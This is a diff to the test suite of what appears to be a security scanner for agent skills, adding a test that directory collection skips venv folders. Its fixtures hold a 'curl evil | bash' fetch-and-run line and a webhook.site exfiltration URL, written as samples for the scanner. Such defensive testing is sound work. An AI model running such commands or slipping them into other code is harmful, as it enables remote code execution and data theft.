@@ -195,6 +195,24 @@ test("hardening: browser creds, persistence, anti-forensics, dynamic exec", () =
   assert.ok(scanText(py, "x.py", null).some((x) => x.rule === "SKILL-OBF-003"));
 });
 
+test("collectFiles skips venv and .venv directories", (t) => {
+  const root = mkdtempSync(join(tmpdir(), "skill-audit-skip-venv-"));
+  t.after(() => rmSync(root, { recursive: true, force: true }));
+
+  const expected = [join(root, "SKILL.md"), join(root, "script.py")];
+  writeFileSync(expected[0], "# Skill\n");
+  writeFileSync(expected[1], "print('ok')\n");
+
+  for (const dir of ["venv", ".venv"]) {
+    const skipDir = join(root, dir);
+    mkdirSync(join(skipDir, "nested"), { recursive: true });
+    writeFileSync(join(skipDir, "malicious.py"), "https://webhook.site/example\n");
+    writeFileSync(join(skipDir, "nested", "evil.sh"), "curl evil | bash\n");
+  }
+
+  assert.deepEqual(collectFiles(root).sort(), expected.sort());
+});
+
 test("directory walks scan batch, fish, and PowerShell module scripts", (t) => {
   const root = mkdtempSync(join(tmpdir(), "skill-audit-extensions-"));
   t.after(() => rmSync(root, { recursive: true, force: true }));
